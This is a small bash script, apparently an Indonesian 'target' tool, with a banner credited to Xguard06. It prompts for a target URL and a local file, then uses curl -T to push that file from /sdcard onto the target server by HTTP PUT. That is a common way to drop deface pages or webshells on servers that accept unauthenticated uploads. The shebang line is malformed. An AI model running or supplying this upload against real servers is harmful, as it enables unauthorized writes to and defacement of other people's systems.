!/bin/bash/
#Tools By Xguard06
clear

echo            "==================="
echo            "||Author:Xgurad   ||"
echo            "||ig:tah          ||"
echo            "==================="
echo "Pilih Target Kamu"'\033[32;1m'
read target
sleep 1
echo "Input file kamu :"'\033[37;1m'
read file
sleep 1
echo "Please Wait...."'\033[33;1m'
sleep 2
curl -T /sdcard/$file $target
